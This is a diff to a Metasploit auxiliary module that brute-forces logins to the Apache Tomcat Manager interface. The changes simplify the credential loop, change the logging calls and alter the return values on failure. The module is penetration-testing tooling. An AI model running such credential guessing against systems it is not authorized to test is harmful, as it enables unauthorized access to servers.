@@ -71,17 +71,13 @@ class Metasploit3 < Msf::Auxiliary
 		return if not res.code == 401
 
 		each_user_pass { |user, pass|
-			userpass_sleep_interval unless self.credentials_tried.empty?
-			this_cred = [user,ip,rport].join(":")
-			next if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]
-			self.credentials_tried[this_cred] = pass
-			do_login(user, pass, this_cred, ip)
+			do_login(user, pass)
 		}
 	end
 
-	def do_login(user='tomcat', pass='tomcat', this_cred='', ip='0.0.0.0')
+	def do_login(user='tomcat', pass='tomcat')
 		verbose = datastore['VERBOSE']
-		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose
+		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' with password:'#{pass}'")
 		success = false
 		srvhdr = '?'
 		user_pass = Rex::Text.encode_base64(user + ":" + pass)
@@ -96,16 +92,16 @@ class Metasploit3 < Msf::Auxiliary
 					}
 				}, 25)
 			unless (res.kind_of? Rex::Proto::Http::Response)
-				print_error("http://#{rhost}:#{rport}/manager/html not responding") if verbose
-				return :done
-			end
-			return :done if (res.code == 404)
+				vprint_error("http://#{rhost}:#{rport}/manager/html not responding")
+				return :abort
+		  end
+			return :abort if (res.code == 404)
 			srvhdr = res.headers['Server']
 			success = true if (res.code == 200)
 
 		rescue ::Rex::ConnectionError
-			print_error("http://#{rhost}:#{rport}/manager/html Unable to attempt authentication") if verbose
-			return :done
+			vprint_error("http://#{rhost}:#{rport}/manager/html Unable to attempt authentication")
+			return :abort
 		end
 
 		if success
@@ -118,12 +114,10 @@ class Metasploit3 < Msf::Auxiliary
 				:targ_host => rhost,
 				:targ_port => rport
 			)
-			self.credentials_good[this_cred] = pass
 			return :next_user
 		else
-			print_error("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'") if verbose
+			vprint_error("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
 			return
 		end
 	end
 end
-
